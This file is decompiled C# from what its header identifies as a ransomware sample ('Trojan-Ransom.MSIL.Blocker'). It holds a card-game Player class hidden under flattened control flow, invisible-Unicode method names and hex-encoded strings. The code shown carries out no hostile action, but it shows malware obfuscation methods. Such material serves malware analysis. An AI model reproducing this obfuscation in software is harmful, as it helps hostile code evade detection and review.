// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: SessionMa, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 29EA69E7-0E4F-4884-A9FC-633229D6DF5B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-c4ce569311f22121bf069cebfeb39abebfd9109cf9a147e550f8801c49529685.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -1094238784;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1410053627)) % 13U)
        {
          case 0:
            str2 = str1;
            num1 = -221400696;
            continue;
          case 1:
            num1 = (int) num2 * 1475439358 ^ 1847250901;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -2141732519 ^ 1534387653;
            continue;
          case 5:
            str1 = "75596D336E4D497162";
            num1 = (int) num2 * -314205600 ^ 1158853337;
            continue;
          case 6:
            num1 = (int) num2 * 1736902203 ^ 897100150;
            continue;
          case 7:
            str1 = "417267756D656E744F75744F6652616E676545786365707469";
            num1 = (int) num2 * -700529114 ^ 1076067092;
            continue;
          case 8:
            num1 = (int) num2 * 996943210 ^ 1016511666;
            continue;
          case 9:
            int num3;
            num1 = num3 = BaseStream != 1 ? -1057756423 : (num3 = -2103003628);
            continue;
          case 10:
            int num4 = BaseStream != 0 ? 620973808 : (num4 = 115696498);
            num1 = num4 ^ (int) num2 * -1237218688;
            continue;
          case 11:
            num1 = (int) num2 * 348346620 ^ 1630150807;
            continue;
          case 12:
            str1 = (string) null;
            num1 = (int) num2 * 322508683 ^ -798005916;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1328240286;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -897964873)) % 4U)
        {
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 907820970 ^ 530662974;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 2:
            goto label_1;
          case 3:
            num4 = 0;
            break;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = -160873909;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 412482671;
        int[] planningCards;
        int num2;
        bool flag;
        int index;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1223570582)) % 15U)
          {
            case 0:
              num2 = planningCards[index];
              num1 = 1697745688;
              continue;
            case 1:
              flag = num2 > 0;
              num1 = (int) num4 * 636986045 ^ -1868859348;
              continue;
            case 2:
              num1 = 987838428;
              continue;
            case 3:
              num1 = (int) num4 * 688532211 ^ -315258285;
              continue;
            case 5:
              ++num3;
              num1 = (int) num4 * 1316638583 ^ 2023079053;
              continue;
            case 6:
              int num5 = flag ? -1166825074 : (num5 = -2067548763);
              num1 = num5 ^ (int) num4 * -1819276264;
              continue;
            case 7:
              num3 = 0;
              num1 = (int) num4 * -236052330 ^ -2116985165;
              continue;
            case 8:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * 182036249 ^ -229107611;
              continue;
            case 9:
              goto label_1;
            case 10:
              int num6;
              num1 = num6 = index < planningCards.Length ? 295100432 : (num6 = 1494364851);
              continue;
            case 11:
              ++index;
              num1 = (int) num4 * -199815971 ^ -144909784;
              continue;
            case 12:
              planningCardsCount = num3;
              num1 = (int) num4 * -838391728 ^ -1355434490;
              continue;
            case 13:
              index = 0;
              num1 = (int) num4 * 1290815070 ^ -856625335;
              continue;
            case 14:
              num1 = (int) num4 * -1493043496 ^ -1614484457;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 959556080;
      string str1;
      string str2;
      int index;
      int planningCard;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 507763868)) % 14U)
        {
          case 0:
            planningCard = this.PlanningCards[index];
            num1 = 1274109537;
            continue;
          case 1:
            num1 = (int) num2 * -1644089018 ^ 24458100;
            continue;
          case 2:
            int num3;
            num1 = num3 = index < this.PlanningCards.Length ? 969884276 : (num3 = 665554360);
            continue;
          case 3:
            int num4 = planningCard == 0 ? -533788344 : (num4 = -1049262940);
            num1 = num4 ^ (int) num2 * -1113532875;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * -871980263 ^ -1239980077;
            continue;
          case 6:
            str2 = str1;
            num1 = (int) num2 * 1890835900 ^ -453381105;
            continue;
          case 7:
            index = 0;
            num1 = (int) num2 * 2136942535 ^ 1755750510;
            continue;
          case 9:
            str1 = Player.\u206E⁬⁭‍‏‏⁫‮‎⁭‍‍‎‮‌‎⁫‌⁮‎⁯‭‪⁯⁭‌‎‌‮‏‪⁭‎‎​⁭‍‮​‌‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 738137919;
            continue;
          case 10:
            str1 = " ";
            num1 = (int) num2 * -1481601320 ^ -1873650723;
            continue;
          case 11:
            num1 = (int) num2 * -39031958 ^ 420253044;
            continue;
          case 12:
            ++index;
            num1 = 427589726;
            continue;
          case 13:
            num1 = (int) num2 * -1338105808 ^ -739502412;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 1901250796;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1635783481)) % 4U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -733557309 ^ 163764320;
            continue;
          case 2:
            num1 = (int) num2 * -2081754343 ^ -613633889;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 998535335;
      int aIndex;
      int count;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 203847448)) % 10U)
        {
          case 0:
            int num3;
            num1 = num3 = aIndex >= count ? 1484029935 : (num3 = 1711179945);
            continue;
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * 1204530740 ^ 412714123;
            continue;
          case 2:
            goto label_1;
          case 3:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 755231300;
            continue;
          case 4:
            ++aIndex;
            num1 = (int) num2 * -79382694 ^ -471877908;
            continue;
          case 5:
            count = json.Count;
            num1 = (int) num2 * -340916198 ^ 178028578;
            continue;
          case 6:
            numArray = new int[count];
            num1 = (int) num2 * -1738145101 ^ -918880190;
            continue;
          case 8:
            aIndex = 0;
            num1 = (int) num2 * -2046405951 ^ 1333797523;
            continue;
          case 9:
            num1 = (int) num2 * 1342049012 ^ -1962062224;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString() => Player.\u200C‮‏‍‮‍⁯​⁭‮‪​‬⁪⁭‎‭‍⁮‌⁪‎‭⁬⁭‮‮⁯⁭⁮⁪⁭⁭⁪‏‫‬‭‌‪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u206E⁬⁭‍‏‏⁫‮‎⁭‍‍‎‮‌‎⁫‌⁮‎⁯‭‪⁯⁭‌‎‌‮‏‪⁭‎‎​⁭‍‮​‌‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200C‮‏‍‮‍⁯​⁭‮‪​‬⁪⁭‎‭‍⁮‌⁪‎‭⁬⁭‮‮⁯⁭⁮⁪⁭⁭⁪‏‫‬‭‌‪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
